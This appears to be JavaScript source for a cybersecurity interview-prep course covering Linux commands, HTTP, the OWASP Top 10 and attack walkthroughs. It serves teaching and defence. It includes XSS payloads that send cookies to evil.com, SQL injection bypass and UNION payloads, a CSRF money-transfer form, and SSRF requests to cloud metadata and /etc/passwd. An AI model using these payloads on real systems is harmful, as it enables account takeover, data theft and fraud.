<span class="comment"># rwx = 7, r-x = 5, r-- = 4 → 754</span>

<span class="cmd">chmod 755 file.sh</span>    <span class="comment"># rwxr-xr-x</span>
<span class="cmd">chmod 644 file.txt</span>   <span class="comment"># rw-r--r--</span>
<span class="cmd">chmod +x script.sh</span>   <span class="comment"># Add execute permission</span>
<span class="cmd">chown user:group file</span> <span class="comment"># Change file owner</span>`)}

    ${quiz('q4', 'What does chmod 777 do?',
      ['Read only for all', 'Full permissions (rwx) for owner, group, and others', 'Write only for owner', 'No permissions'],
      1, 'chmod 777 = rwxrwxrwx — gives read, write, and execute permissions to everyone. This is a security risk and should rarely be used!')}
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">🌐</span> Networking Commands in Linux</h2>
    ${terminal('Network Commands', `<span class="cmd">ifconfig</span>          <span class="comment"># Show network interfaces (older)</span>
<span class="cmd">ip addr show</span>      <span class="comment"># Show IP addresses (modern)</span>
<span class="cmd">ping 8.8.8.8</span>      <span class="comment"># Test connectivity (ICMP)</span>
<span class="cmd">traceroute google.com</span>  <span class="comment"># Trace route to host</span>
<span class="cmd">nslookup google.com</span>    <span class="comment"># DNS lookup</span>
<span class="cmd">dig google.com</span>    <span class="comment"># Detailed DNS lookup</span>
<span class="cmd">netstat -tulnp</span>    <span class="comment"># Show listening ports</span>
<span class="cmd">ss -tulnp</span>         <span class="comment"># Modern alternative to netstat</span>
<span class="cmd">curl https://example.com</span>  <span class="comment"># HTTP request from terminal</span>
<span class="cmd">wget https://file.com/file.zip</span>  <span class="comment"># Download files</span>
<span class="cmd">arp -a</span>            <span class="comment"># Show ARP table</span>
<span class="cmd">route -n</span>          <span class="comment"># Show routing table</span>
<span class="cmd">whois example.com</span> <span class="comment"># Domain registration info</span>`)}

    <h3>Process Management</h3>
    ${terminal('Process Commands', `<span class="cmd">ps aux</span>            <span class="comment"># List all running processes</span>
<span class="cmd">top</span>               <span class="comment"># Real-time process monitor</span>
<span class="cmd">kill PID</span>          <span class="comment"># Kill process by PID</span>
<span class="cmd">kill -9 PID</span>       <span class="comment"># Force kill</span>
<span class="cmd">bg</span>                <span class="comment"># Send process to background</span>
<span class="cmd">fg</span>                <span class="comment"># Bring to foreground</span>
<span class="cmd">crontab -e</span>        <span class="comment"># Schedule tasks</span>`)}

    <h3>Useful for Pentesting</h3>
    ${terminal('Pentesting Helpers', `<span class="cmd">echo "text" | base64</span>       <span class="comment"># Encode to base64</span>
<span class="cmd">echo "dGV4dA==" | base64 -d</span> <span class="comment"># Decode base64</span>
<span class="cmd">echo -n "text" | md5sum</span>     <span class="comment"># Generate MD5 hash</span>
<span class="cmd">echo -n "text" | sha256sum</span>  <span class="comment"># Generate SHA-256 hash</span>
<span class="cmd">nc -lvp 4444</span>     <span class="comment"># Listen on port (netcat)</span>
<span class="cmd">nc target 80</span>      <span class="comment"># Connect to port</span>
<span class="cmd">ssh user@host</span>     <span class="comment"># SSH into remote server</span>
<span class="cmd">scp file user@host:/path</span>  <span class="comment"># Secure copy over SSH</span>`)}
  </div>

  ${practiceBox([
    { text: 'OverTheWire Bandit — Learn Linux through CTF challenges', url: 'https://overthewire.org/wargames/bandit/' },
    { text: 'Linux Journey — Free interactive Linux tutorial', url: 'https://linuxjourney.com/' },
    { text: 'ExplainShell — Understand any Linux command', url: 'https://explainshell.com/' }
  ])}

  ${keyPoints([
    'Know /etc/passwd (users), /etc/shadow (password hashes), /var/log (logs)',
    'chmod: r=4, w=2, x=1. So 755 = rwxr-xr-x',
    'Key network commands: ifconfig, ping, netstat, nslookup, dig, curl, traceroute',
    'grep for searching, find for locating files, pipe | for chaining',
    'netcat (nc) is the Swiss army knife of networking',
    'Always check ps aux and netstat -tulnp during investigation'
  ])}

  ${moduleFooter('mod3', 'mod2', 'mod4')}`;
}


// ============ MODULE 4: HTTP, Web & APIs ============
function renderModule4() {
  return `
  <div class="module-header fade-in">
    <div class="module-tag">Module 04 · 2 hrs</div>
    <h1>🌍 HTTP, Web & APIs</h1>
    <p class="module-desc">Understanding how the web works is critical for application security testing. HTTP methods, status codes, cookies, sessions, and REST APIs.</p>
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">🔄</span> How the Web Works</h2>
    <div class="attack-flow">
      <div class="attack-step">User types<br>URL in browser</div>
      <div class="attack-arrow">→</div>
      <div class="attack-step">DNS resolves<br>domain → IP</div>
      <div class="attack-arrow">→</div>
      <div class="attack-step">TCP connection<br>(3-way handshake)</div>
      <div class="attack-arrow">→</div>
      <div class="attack-step">TLS handshake<br>(if HTTPS)</div>
      <div class="attack-arrow">→</div>
      <div class="attack-step">HTTP Request<br>sent to server</div>
      <div class="attack-arrow">→</div>
      <div class="attack-step">Server processes<br>& responds</div>
    </div>
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">📨</span> HTTP Methods</h2>
    <table class="comparison-table">
      <tr><th>Method</th><th>Purpose</th><th>Has Body?</th><th>Idempotent?</th></tr>
      <tr><td><strong>GET</strong></td><td>Retrieve data</td><td>No</td><td>Yes</td></tr>
      <tr><td><strong>POST</strong></td><td>Submit/create data</td><td>Yes</td><td>No</td></tr>
      <tr><td><strong>PUT</strong></td><td>Update/replace entire resource</td><td>Yes</td><td>Yes</td></tr>
      <tr><td><strong>PATCH</strong></td><td>Partially update resource</td><td>Yes</td><td>No</td></tr>
      <tr><td><strong>DELETE</strong></td><td>Delete resource</td><td>Optional</td><td>Yes</td></tr>
      <tr><td><strong>OPTIONS</strong></td><td>Check allowed methods (CORS preflight)</td><td>No</td><td>Yes</td></tr>
      <tr><td><strong>HEAD</strong></td><td>Same as GET but no body in response</td><td>No</td><td>Yes</td></tr>
    </table>
    ${conceptCard('warning', '⚠️ Security Note', '<p>GET requests should never modify data. Parameters appear in URL (visible in browser history, logs). Sensitive data should use POST with HTTPS.</p>')}
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">📊</span> HTTP Status Codes</h2>
    <table class="comparison-table">
      <tr><th>Code</th><th>Meaning</th><th>Security Relevance</th></tr>
      <tr><td><strong>200</strong></td><td>OK — Success</td><td>Normal response</td></tr>
      <tr><td><strong>301/302</strong></td><td>Redirect (Permanent/Temporary)</td><td>Open redirect vulnerability</td></tr>
      <tr><td><strong>400</strong></td><td>Bad Request</td><td>Malformed input</td></tr>
      <tr><td><strong>401</strong></td><td>Unauthorized</td><td>Not authenticated (need to log in)</td></tr>
      <tr><td><strong>403</strong></td><td>Forbidden</td><td>Authenticated but not authorized</td></tr>
      <tr><td><strong>404</strong></td><td>Not Found</td><td>Resource doesn't exist</td></tr>
      <tr><td><strong>405</strong></td><td>Method Not Allowed</td><td>Wrong HTTP method used</td></tr>
      <tr><td><strong>500</strong></td><td>Internal Server Error</td><td>Server-side error (may leak info)</td></tr>
      <tr><td><strong>502</strong></td><td>Bad Gateway</td><td>Upstream server issue</td></tr>
      <tr><td><strong>503</strong></td><td>Service Unavailable</td><td>Server overloaded/down</td></tr>
    </table>
    ${quiz('q_http1', 'A user logs in successfully but cannot access the admin panel. What status code should the server return?', ['401', '403', '404', '500'], 1, '403 Forbidden — the user IS authenticated (logged in) but is NOT authorized to access the admin panel. 401 would mean they are not logged in at all.')}
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">📋</span> HTTP Headers (Security Important)</h2>
    <table class="comparison-table">
      <tr><th>Header</th><th>Purpose</th><th>Security Use</th></tr>
      <tr><td><code>Content-Type</code></td><td>Specifies data format</td><td>Prevents MIME sniffing attacks</td></tr>
      <tr><td><code>Authorization</code></td><td>Carries auth credentials</td><td>Bearer tokens, Basic auth</td></tr>
      <tr><td><code>Set-Cookie</code></td><td>Server sets cookie</td><td>Session management</td></tr>
      <tr><td><code>X-Frame-Options</code></td><td>Prevents clickjacking</td><td>DENY or SAMEORIGIN</td></tr>
      <tr><td><code>Content-Security-Policy</code></td><td>Controls resource loading</td><td>Prevents XSS</td></tr>
      <tr><td><code>Strict-Transport-Security</code></td><td>Forces HTTPS</td><td>Prevents downgrade attacks</td></tr>
      <tr><td><code>X-Content-Type-Options</code></td><td>Prevents MIME sniffing</td><td>Set to nosniff</td></tr>
      <tr><td><code>Access-Control-Allow-Origin</code></td><td>CORS header</td><td>Controls cross-origin access</td></tr>
    </table>
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">🍪</span> Cookies & Sessions</h2>
    <h3>Cookies</h3>
    <p>Small pieces of data stored by browser, sent with every request to the domain.</p>
    <table class="comparison-table">
      <tr><th>Cookie Flag</th><th>Purpose</th><th>Security Benefit</th></tr>
      <tr><td><code>HttpOnly</code></td><td>Not accessible via JavaScript</td><td>Prevents XSS from stealing session cookies</td></tr>
      <tr><td><code>Secure</code></td><td>Only sent over HTTPS</td><td>Prevents interception over HTTP</td></tr>
      <tr><td><code>SameSite</code></td><td>Controls cross-site sending</td><td>Prevents CSRF attacks</td></tr>
      <tr><td><code>Domain</code></td><td>Which domain receives the cookie</td><td>Scope control</td></tr>
      <tr><td><code>Path</code></td><td>URL path scope</td><td>Limit cookie to specific paths</td></tr>
    </table>
    ${conceptCard('danger', '🔴 Critical Interview Point', '<p>If a session cookie does NOT have <code>HttpOnly</code> flag, an attacker can steal it using XSS: <code>document.cookie</code> will expose it. If it lacks <code>Secure</code> flag, it can be intercepted on HTTP. If <code>SameSite=None</code>, it enables CSRF.</p>')}

    <h3>Session Management</h3>
    <ul>
      <li><strong>Session-based:</strong> Server stores session data, client gets session ID cookie</li>
      <li><strong>Token-based (JWT):</strong> Server sends signed token, client stores it (localStorage or cookie)</li>
    </ul>

    <h3>JWT (JSON Web Token)</h3>
    <p>Format: <code>header.payload.signature</code> (Base64 encoded)</p>
    ${terminal('JWT Example', `<span class="comment"># JWT has 3 parts separated by dots:</span>
<span class="highlight">eyJhbGciOiJIUzI1NiJ9</span>.<span class="string">eyJ1c2VyIjoiYWRtaW4ifQ</span>.<span class="warning">SflKxwRJSMeKKF2QT4fwpM</span>

<span class="highlight">Header:</span>  {"alg": "HS256", "typ": "JWT"}
<span class="string">Payload:</span> {"user": "admin", "role": "user", "exp": 1234567890}
<span class="warning">Signature:</span> HMAC-SHA256(header + "." + payload, secret)

<span class="comment"># JWT Attacks:</span>
<span class="comment"># 1. Change alg to "none" — bypass signature verification</span>
<span class="comment"># 2. Brute force weak secret keys</span>
<span class="comment"># 3. Modify payload (e.g., change role to admin)</span>`)}
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">🔗</span> REST APIs</h2>
    <p>REST (Representational State Transfer) APIs use HTTP methods to perform CRUD operations:</p>
    <table class="comparison-table">
      <tr><th>Operation</th><th>HTTP Method</th><th>Example</th></tr>
      <tr><td>Create</td><td>POST</td><td>POST /api/users</td></tr>
      <tr><td>Read</td><td>GET</td><td>GET /api/users/123</td></tr>
      <tr><td>Update</td><td>PUT/PATCH</td><td>PUT /api/users/123</td></tr>
      <tr><td>Delete</td><td>DELETE</td><td>DELETE /api/users/123</td></tr>
    </table>

    ${caseStudy('API Security — IDOR on User Profile', `
      <p><strong>Scenario:</strong> An API endpoint <code>GET /api/users/123</code> returns user 123's profile data.</p>
      <p><strong>Attack:</strong> An attacker changes the ID to <code>GET /api/users/124</code> and gets another user's data.</p>
      <p><strong>This is IDOR</strong> (Insecure Direct Object Reference) — the API doesn't check if the authenticated user has permission to access user 124's data.</p>
      <p><strong>Prevention:</strong> Always verify that the authenticated user is authorized to access the requested resource. Don't rely on sequential/predictable IDs — use UUIDs.</p>
    `)}
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">🔐</span> HTTP vs HTTPS</h2>
    <table class="comparison-table">
      <tr><th>Feature</th><th>HTTP</th><th>HTTPS</th></tr>
      <tr><td>Port</td><td>80</td><td>443</td></tr>
      <tr><td>Encryption</td><td>None (plaintext)</td><td>TLS/SSL encrypted</td></tr>
      <tr><td>Certificate</td><td>Not required</td><td>SSL/TLS certificate required</td></tr>
      <tr><td>Security</td><td>Vulnerable to MITM, sniffing</td><td>Protected from eavesdropping</td></tr>
    </table>
    <p><strong>TLS Handshake:</strong> Client Hello → Server Hello + Certificate → Key Exchange → Encrypted communication begins.</p>

    <h3>CORS (Cross-Origin Resource Sharing)</h3>
    <p>Browsers block cross-origin requests by default. CORS headers on the server allow specific origins:</p>
    ${terminal('CORS Headers', `<span class="highlight">Access-Control-Allow-Origin:</span> https://trusted-site.com
<span class="highlight">Access-Control-Allow-Methods:</span> GET, POST
<span class="highlight">Access-Control-Allow-Headers:</span> Content-Type, Authorization

<span class="comment"># Misconfigured CORS (DANGEROUS):</span>
<span class="warning">Access-Control-Allow-Origin: *</span>  <span class="comment"># Allows ANY origin!</span>`)}
  </div>

  ${keyPoints([
    'Know all HTTP methods: GET (read), POST (create), PUT (update), DELETE (remove)',
    '401 = not authenticated; 403 = not authorized — know the difference!',
    'Cookie flags: HttpOnly (no JS access), Secure (HTTPS only), SameSite (CSRF protection)',
    'JWT has 3 parts: header.payload.signature — all base64 encoded',
    'REST APIs map CRUD to HTTP methods',
    'HTTPS = HTTP + TLS encryption on port 443',
    'CORS misconfigurations (Allow-Origin: *) are a common vulnerability',
    'Security headers: CSP, X-Frame-Options, HSTS, X-Content-Type-Options'
  ])}

  ${moduleFooter('mod4', 'mod3', 'mod5')}`;
}


// ============ MODULE 5: OWASP Top 10 ============
function renderModule5() {
  return `
  <div class="module-header fade-in">
    <div class="module-tag">Module 05 · 3 hrs</div>
    <h1>📋 OWASP Top 10 (2021)</h1>
    <p class="module-desc">The OWASP Top 10 is the gold standard for web application security risks. You MUST know all 10 for the interview. Kratikal does VAPT — this is their bread and butter.</p>
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">📌</span> What is OWASP?</h2>
    <p><strong>OWASP</strong> = Open Web Application Security Project. It's a nonprofit foundation that produces free articles, tools, and standards for web application security. The <strong>OWASP Top 10</strong> is a regularly updated list of the 10 most critical web application security risks.</p>
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">1️⃣</span> A01: Broken Access Control</h2>
    <p><strong>Rank #1 — Most common vulnerability.</strong> Users can act outside their intended permissions.</p>
    <ul>
      <li>Accessing other users' data by changing URL parameters (IDOR)</li>
      <li>Accessing admin pages without proper authorization</li>
      <li>Bypassing access checks by modifying API requests</li>
      <li>CORS misconfiguration allowing unauthorized API access</li>
    </ul>
    ${caseStudy('Broken Access Control on E-commerce Site', `
      <p><strong>Scenario:</strong> User views their order at <code>/orders?id=1001</code></p>
      <p><strong>Attack:</strong> Change to <code>/orders?id=1002</code> — sees another user's order details, address, phone number.</p>
      <p><strong>Impact:</strong> Personal data exposure, privacy violation, potential financial fraud.</p>
      <p><strong>Fix:</strong> Server must verify that the logged-in user owns order 1002 before showing data. Use server-side access control, not just hiding UI elements.</p>
    `)}
    ${conceptCard('success', '✅ Prevention', '<ul><li>Deny by default — require explicit grants</li><li>Implement server-side access control checks</li><li>Use role-based access control (RBAC)</li><li>Disable directory listing on web server</li><li>Log access control failures and alert admins</li></ul>')}
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">2️⃣</span> A02: Cryptographic Failures</h2>
    <p>Previously "Sensitive Data Exposure." Failures in cryptography that lead to exposure of sensitive data.</p>
    <ul>
      <li>Storing passwords in plaintext or weak hashes (MD5, SHA-1)</li>
      <li>Transmitting data over HTTP instead of HTTPS</li>
      <li>Using weak/deprecated algorithms (DES, RC4)</li>
      <li>Hardcoded encryption keys in source code</li>
    </ul>
    ${conceptCard('success', '✅ Prevention', '<ul><li>Use HTTPS everywhere (TLS 1.2+)</li><li>Hash passwords with bcrypt/argon2 (with salt)</li><li>Encrypt sensitive data at rest (AES-256)</li><li>Never store encryption keys in code</li><li>Disable caching for sensitive responses</li></ul>')}
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">3️⃣</span> A03: Injection</h2>
    <p>User-supplied data is sent to an interpreter as part of a command/query without validation.</p>
    <ul>
      <li><strong>SQL Injection</strong> — Manipulate database queries</li>
      <li><strong>Command Injection</strong> — Execute OS commands</li>
      <li><strong>LDAP Injection</strong> — Manipulate directory queries</li>
      <li><strong>XSS (Cross-Site Scripting)</strong> — Inject client-side scripts</li>
    </ul>
    ${terminal('SQL Injection Example', `<span class="comment"># Login form sends:</span>
SELECT * FROM users WHERE username='<span class="warning">admin</span>' AND password='<span class="warning">password</span>'

<span class="comment"># Attacker enters in password field:</span>
<span class="warning">' OR '1'='1</span>

<span class="comment"># Query becomes:</span>
SELECT * FROM users WHERE username='admin' AND password='<span class="warning">' OR '1'='1</span>'
<span class="comment"># This is always TRUE — bypasses authentication!</span>`)}
    ${conceptCard('success', '✅ Prevention', '<ul><li>Use parameterized queries / prepared statements</li><li>Input validation and sanitization</li><li>Use ORM frameworks</li><li>Principle of least privilege for database accounts</li><li>WAF rules for common injection patterns</li></ul>')}
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">4️⃣</span> A04: Insecure Design</h2>
    <p>Flaws in the design/architecture itself, not implementation bugs. Missing security controls.</p>
    <ul>
      <li>No rate limiting on login (allows brute force)</li>
      <li>Security questions that are easily guessable</li>
      <li>No account lockout after failed attempts</li>
      <li>Forgot password reveals if email exists</li>
    </ul>
    ${conceptCard('success', '✅ Prevention', '<ul><li>Threat modeling during design phase</li><li>Use secure design patterns and reference architectures</li><li>Implement rate limiting and account lockout</li><li>Use generic error messages</li></ul>')}
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">5️⃣</span> A05: Security Misconfiguration</h2>
    <p>Improperly configured security settings, default configurations left unchanged.</p>
    <ul>
      <li>Default credentials left on admin panels (admin/admin)</li>
      <li>Unnecessary features enabled (directory listing, debug mode)</li>
      <li>Detailed error messages exposing stack traces</li>
      <li>Missing security headers (CSP, X-Frame-Options)</li>
      <li>Unnecessary open ports</li>
    </ul>
    ${conceptCard('success', '✅ Prevention', '<ul><li>Hardening guides for all platforms</li><li>Remove default accounts and passwords</li><li>Disable directory listing and debug mode</li><li>Implement all security headers</li><li>Automated configuration scanning</li></ul>')}
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">6️⃣</span> A06: Vulnerable & Outdated Components</h2>
    <p>Using libraries, frameworks, or components with known vulnerabilities.</p>
    <ul>
      <li>Running outdated versions of Apache, jQuery, WordPress</li>
      <li>Not patching known CVEs (Common Vulnerabilities and Exposures)</li>
      <li>Using abandoned/unmaintained libraries</li>
    </ul>
    ${conceptCard('success', '✅ Prevention', '<ul><li>Keep all components updated</li><li>Remove unused dependencies</li><li>Monitor CVE databases and security advisories</li><li>Use tools like OWASP Dependency-Check, Snyk, npm audit</li></ul>')}
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">7️⃣</span> A07: Identification & Authentication Failures</h2>
    <p>Weaknesses in authentication mechanisms.</p>
    <ul>
      <li>Permits brute force attacks (no rate limiting)</li>
      <li>Allows weak passwords (123456)</li>
      <li>Poor session management (session IDs in URL)</li>
      <li>Missing MFA for critical operations</li>
      <li>Session not invalidated on logout</li>
    </ul>
    ${caseStudy('Brute Force on Login Page', `
      <p><strong>Scenario:</strong> Login page at <code>/login</code> with no rate limiting.</p>
      <p><strong>Attack:</strong> Attacker uses Burp Suite Intruder to try thousands of passwords for user "admin".</p>
      <p><strong>How to detect:</strong> Observe different response length/status for correct vs wrong password.</p>
      <p><strong>Fix:</strong> Rate limiting (e.g., 5 attempts per minute), CAPTCHA after 3 failed attempts, account lockout after 10 failures, MFA.</p>
    `)}
    ${conceptCard('success', '✅ Prevention', '<ul><li>Implement MFA</li><li>Rate limiting and account lockout</li><li>Strong password policies</li><li>Secure session management</li><li>Don\'t ship with default credentials</li></ul>')}
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">8️⃣</span> A08: Software & Data Integrity Failures</h2>
    <p>Code and infrastructure that doesn't protect against integrity violations. Insecure CI/CD pipelines, auto-updates without verification.</p>
    ${conceptCard('success', '✅ Prevention', '<ul><li>Use digital signatures for software updates</li><li>Verify integrity of dependencies (checksums)</li><li>Secure CI/CD pipeline with proper access controls</li><li>Don\'t use unverified CDN scripts without SRI (Subresource Integrity)</li></ul>')}
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">9️⃣</span> A09: Security Logging & Monitoring Failures</h2>
    <p>Without proper logging, breaches go undetected. Average breach detection time: <strong>287 days</strong>.</p>
    <ul>
      <li>Login failures not logged</li>
      <li>No alerting for suspicious activities</li>
      <li>Logs stored only locally (attacker can delete them)</li>
      <li>No monitoring of API activity</li>
    </ul>
    ${conceptCard('success', '✅ Prevention', '<ul><li>Log all authentication events (success AND failure)</li><li>Centralized log management (SIEM)</li><li>Set up alerts for suspicious patterns</li><li>Ensure logs cannot be tampered with</li><li>Implement incident response plan</li></ul>')}
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">🔟</span> A10: Server-Side Request Forgery (SSRF)</h2>
    <p>Application fetches a remote resource based on user-supplied URL without validation.</p>
    ${terminal('SSRF Example', `<span class="comment"># Application has a feature to fetch URL content:</span>
GET /fetch?url=<span class="warning">https://example.com/page</span>

<span class="comment"># Attacker changes URL to internal resource:</span>
GET /fetch?url=<span class="warning">http://169.254.169.254/latest/meta-data/</span>
<span class="comment"># This accesses AWS metadata endpoint — can leak credentials!</span>

GET /fetch?url=<span class="warning">http://localhost:3306/</span>
<span class="comment"># Access internal MySQL service</span>

GET /fetch?url=<span class="warning">file:///etc/passwd</span>
<span class="comment"># Read local files!</span>`)}
    ${conceptCard('success', '✅ Prevention', '<ul><li>Whitelist allowed URLs/domains</li><li>Block requests to internal/private IPs (10.x, 172.16-31.x, 192.168.x, 127.x, 169.254.x)</li><li>Don\'t expose raw responses to users</li><li>Use firewall rules to restrict server outbound traffic</li></ul>')}
  </div>

  ${keyPoints([
    'A01 Broken Access Control = #1 most common. Always check IDOR!',
    'A03 Injection — use parameterized queries, NEVER concatenate user input into queries',
    'A05 Security Misconfiguration — check defaults, debug mode, directory listing',
    'A07 Auth Failures — rate limiting, MFA, strong passwords, session management',
    'A10 SSRF — validate/whitelist URLs, block internal IPs',
    'For every vulnerability: know what it is, how to exploit it, and how to prevent it'
  ])}

  ${practiceBox([
    { text: 'OWASP Top 10 Official Page', url: 'https://owasp.org/www-project-top-ten/' },
    { text: 'OWASP WebGoat — Practice vulnerable app', url: 'https://owasp.org/www-project-webgoat/' },
    { text: 'PortSwigger Web Security Academy (FREE)', url: 'https://portswigger.net/web-security' }
  ])}

  ${moduleFooter('mod5', 'mod4', 'mod6')}`;
}


// ============ MODULE 6: Attacks Deep Dive ============
function renderModule6() {
  return `
  <div class="module-header fade-in">
    <div class="module-tag">Module 06 · 4 hrs</div>
    <h1>⚔️ Attacks Deep Dive</h1>
    <p class="module-desc">This is the MOST IMPORTANT module for your interview. For each attack: what it is, how it works, what harm it causes, and how to prevent it. Includes real-world case studies.</p>
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">💉</span> SQL Injection (SQLi)</h2>
    <p><strong>Severity:</strong> <span class="severity critical">CRITICAL</span></p>
    <p>Attacker injects malicious SQL statements through user input to manipulate the database.</p>

    <h3>Types of SQL Injection</h3>
    <table class="comparison-table">
      <tr><th>Type</th><th>How it Works</th><th>Example</th></tr>
      <tr><td><strong>In-band (Classic)</strong></td><td>Results shown directly on page</td><td>UNION-based, Error-based</td></tr>
      <tr><td><strong>Blind SQLi</strong></td><td>No visible output, infer data from behavior</td><td>Boolean-based, Time-based</td></tr>
      <tr><td><strong>Out-of-band</strong></td><td>Data sent to external server</td><td>DNS/HTTP exfiltration</td></tr>
    </table>

    ${caseStudy('SQL Injection on Login Page', `
      <p><strong>Scenario:</strong> A login form at <code>/login</code> sends username and password to the server.</p>
      <p><strong>Backend code (vulnerable):</strong></p>
      <div class="terminal-block"><div class="terminal-body"><span class="comment">// VULNERABLE CODE — never do this!</span>
query = "SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'"</div></div>
      <p><strong>Attack Payloads:</strong></p>
      <div class="terminal-block"><div class="terminal-body"><span class="comment"># 1. Authentication Bypass</span>
Username: <span class="warning">admin' --</span>
Password: <span class="warning">anything</span>
<span class="comment"># Query becomes: SELECT * FROM users WHERE username='admin' --' AND password='anything'</span>
<span class="comment"># The -- comments out the password check!</span>

<span class="comment"># 2. Universal bypass</span>
Username: <span class="warning">' OR 1=1 --</span>
Password: <span class="warning">anything</span>
<span class="comment"># Returns all users — logs in as first user (usually admin)</span>

<span class="comment"># 3. UNION-based data extraction</span>
Input: <span class="warning">' UNION SELECT username, password FROM users --</span>
<span class="comment"># Extracts all usernames and password hashes</span>

<span class="comment"># 4. Time-based blind SQLi</span>
Input: <span class="warning">' OR IF(1=1, SLEEP(5), 0) --</span>
<span class="comment"># If page takes 5 seconds to respond, SQLi confirmed</span></div></div>
      <p><strong>What harm it can do:</strong></p>
      <ul>
        <li>Bypass authentication completely</li>
        <li>Read entire database (usernames, passwords, credit cards)</li>
        <li>Modify or delete data</li>
        <li>Execute OS commands (in some databases)</li>
        <li>Read files from the server</li>
      </ul>
      <p><strong>Prevention:</strong></p>
      <ul>
        <li>Use <strong>Parameterized Queries / Prepared Statements</strong> (most important!)</li>
        <li>Input validation (whitelist acceptable characters)</li>
        <li>Use ORM frameworks (Django ORM, Hibernate)</li>
        <li>Least privilege database accounts</li>
        <li>WAF rules to detect SQL patterns</li>
      </ul>
    `)}
    ${terminal('Safe Code (Parameterized Query)', `<span class="comment"># Python example with parameterized query:</span>
<span class="cmd">cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", (username, password))</span>
<span class="comment"># The %s are placeholders — user input is treated as DATA, never as SQL code</span>

<span class="comment"># Node.js example:</span>
<span class="cmd">db.query("SELECT * FROM users WHERE username = ? AND password = ?", [username, password])</span>`)}
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">📝</span> Cross-Site Scripting (XSS)</h2>
    <p><strong>Severity:</strong> <span class="severity high">HIGH</span></p>
    <p>Attacker injects malicious JavaScript into web pages viewed by other users.</p>

    <h3>Types of XSS</h3>
    <table class="comparison-table">
      <tr><th>Type</th><th>How it Works</th><th>Persistence</th></tr>
      <tr><td><strong>Reflected XSS</strong></td><td>Payload in URL/request, reflected back in response</td><td>Non-persistent (one-time)</td></tr>
      <tr><td><strong>Stored XSS</strong></td><td>Payload saved in database, shown to all users</td><td>Persistent (most dangerous)</td></tr>
      <tr><td><strong>DOM-based XSS</strong></td><td>Payload manipulates client-side DOM directly</td><td>Client-side only</td></tr>
    </table>

    ${caseStudy('Stored XSS on Comment Section', `
      <p><strong>Scenario:</strong> A blog allows users to post comments. Comments are displayed to all visitors.</p>
      <p><strong>Attack:</strong> Attacker posts a comment containing:</p>
      <div class="terminal-block"><div class="terminal-body"><span class="warning">&lt;script&gt;document.location='https://evil.com/steal?cookie='+document.cookie&lt;/script&gt;</span>

<span class="comment"># What happens:</span>
<span class="comment"># 1. Comment is saved in database with the script</span>
<span class="comment"># 2. When ANY user visits the page, the script executes</span>
<span class="comment"># 3. User's session cookie is sent to attacker's server</span>
<span class="comment"># 4. Attacker uses the cookie to hijack the session</span>

<span class="comment"># Other XSS payloads:</span>
<span class="warning">&lt;img src=x onerror="alert(document.cookie)"&gt;</span>
<span class="warning">&lt;svg onload="fetch('https://evil.com?c='+document.cookie)"&gt;</span>
<span class="warning">&lt;body onload="alert('XSS')"&gt;</span></div></div>
      <p><strong>What harm it can do:</strong></p>
      <ul>
        <li>Steal session cookies → account takeover</li>
        <li>Keylogging (capture passwords as user types)</li>
        <li>Redirect users to phishing sites</li>
        <li>Deface the website</li>
        <li>Distribute malware</li>
      </ul>
      <p><strong>Prevention:</strong></p>
      <ul>
        <li><strong>Output encoding/escaping</strong> — convert &lt; to &amp;lt; etc.</li>
        <li><strong>Content Security Policy (CSP)</strong> header</li>
        <li>Input validation (reject/strip HTML tags)</li>
        <li><code>HttpOnly</code> cookie flag (prevents JS access to cookies)</li>
        <li>Use frameworks that auto-escape (React, Angular)</li>
      </ul>
    `)}
    ${quiz('q_xss1', 'Which type of XSS is most dangerous because it affects ALL visitors?', ['Reflected XSS', 'Stored XSS', 'DOM-based XSS', 'Self XSS'], 1, 'Stored XSS is most dangerous because the malicious script is permanently saved in the database and executes for every user who views the affected page.')}
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">🔄</span> Cross-Site Request Forgery (CSRF)</h2>
    <p><strong>Severity:</strong> <span class="severity high">HIGH</span></p>
    <p>Tricks a logged-in user into making unintended requests to a site where they're authenticated.</p>

    ${caseStudy('CSRF — Unauthorized Money Transfer', `
      <p><strong>Scenario:</strong> You're logged into your bank at <code>bank.com</code>. The transfer endpoint is:</p>
      <div class="terminal-block"><div class="terminal-body"><span class="cmd">POST /transfer</span>
<span class="highlight">Cookie: session=abc123</span>
to=friend&amount=1000</div></div>
      <p><strong>Attack:</strong> Attacker sends you a link to a malicious page containing:</p>
      <div class="terminal-block"><div class="terminal-body"><span class="warning">&lt;form action="https://bank.com/transfer" method="POST" id="csrf"&gt;
  &lt;input type="hidden" name="to" value="attacker_account"&gt;
  &lt;input type="hidden" name="amount" value="50000"&gt;
&lt;/form&gt;
&lt;script&gt;document.getElementById('csrf').submit();&lt;/script&gt;</span>

<span class="comment"># When you visit the page:</span>
<span class="comment"># 1. Your browser automatically includes bank.com cookies</span>
<span class="comment"># 2. The form submits a transfer to the attacker</span>
<span class="comment"># 3. Bank processes it because your session cookie is valid!</span></div></div>
      <p><strong>Prevention:</strong></p>
      <ul>
        <li><strong>CSRF Tokens</strong> — unique, random token per form that server validates</li>
        <li><code>SameSite</code> cookie attribute (Strict or Lax)</li>
        <li>Re-authenticate for sensitive actions (confirm password)</li>
        <li>Check Referer/Origin headers</li>
      </ul>
    `)}
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">🆔</span> IDOR (Insecure Direct Object Reference)</h2>
